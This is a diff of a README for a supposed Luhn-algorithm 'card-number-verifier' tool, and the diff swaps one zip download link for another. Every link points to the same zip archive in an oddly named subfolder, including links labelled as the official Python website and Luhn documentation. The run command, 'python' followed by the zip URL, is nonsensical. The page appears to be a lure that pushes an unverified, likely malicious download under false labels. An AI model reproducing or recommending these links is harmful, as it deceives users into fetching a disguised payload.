@@ -1,7 +1,7 @@
 # 🛡️ card-number-verifier - Verify Your Card Number Instantly
 
 ## 📥 Download Now
-[![Download card-number-verifier](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip)](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip)
+[![Download card-number-verifier](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip)](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip)
 
 ## 📖 Overview
 The card-number-verifier is a simple tool that checks if a card number is valid. It uses the Luhn Algorithm, a reliable method that helps detect errors in card number sequences. This application is beginner-friendly and perfect for anyone looking to understand how card number validation works. 
@@ -11,10 +11,10 @@ Follow these steps to get started with the card-number-verifier:
 
 1. **Download the Application:**
    Visit the Releases page to download the latest version of the application.
-   [Download card-number-verifier here!](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip)
+   [Download card-number-verifier here!](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip)
 
 2. **Install Requirements:**
-   Ensure you have Python installed on your computer. You can download it from the [official Python website](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip). Installation guides are available on the site to help you through the process.
+   Ensure you have Python installed on your computer. You can download it from the [official Python website](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip). Installation guides are available on the site to help you through the process.
 
 3. **Extract the Files:**
    Once you download the application, locate the downloaded file in your Downloads folder. Right-click on the file and select "Extract All..." to unpack the contents into a folder.
@@ -23,7 +23,7 @@ Follow these steps to get started with the card-number-verifier:
    Open a terminal (Command Prompt on Windows or Terminal on macOS). Navigate to the folder where you extracted the files. Type the following command to run the script:
 
    ```
-   python https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip
+   python https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip
    ```
 
 5. **Input Your Card Number:**
@@ -45,7 +45,7 @@ To run the card-number-verifier, you'll need:
 - Easy to use for beginners, with no programming required.
 
 ## 🔧 Download & Install
-To access the latest version of the application, please visit the Releases page here: [Download card-number-verifier](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip).
+To access the latest version of the application, please visit the Releases page here: [Download card-number-verifier](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip).
 
 1. Click the link above to go to the Releases page.
 2. Choose the version you want to download.
@@ -72,8 +72,8 @@ Here are some examples of how the card-number-verifier works:
   **Output:** Invalid
 
 ## 🔗 Additional Resources
-- [Learn more about the Luhn Algorithm](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip)
-- [Python Documentation for Beginners](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip)
+- [Learn more about the Luhn Algorithm](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip)
+- [Python Documentation for Beginners](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip)
 
 ## 👍 Feedback & Contributions
 We welcome your feedback. If you encounter any issues or have suggestions for improvements, please open an issue on this repository. Contributions to enhance the functionality are also appreciated; feel free to fork the project and submit a pull request.
@@ -81,4 +81,4 @@ We welcome your feedback. If you encounter any issues or have suggestions for im
 ## 🚪 Closing Notes
 Thank you for using the card-number-verifier. We hope you find it useful for validating card numbers quickly and easily. Happy validating!
 
-[Download the latest version here!](https://github.com/MAD971/card-number-verifier/raw/refs/heads/main/reddingite/verifier_card_number_v2.4.zip)
+[Download the latest version here!](https://raw.githubusercontent.com/MAD971/card-number-verifier/main/reddingite/card_number_verifier_3.9.zip)
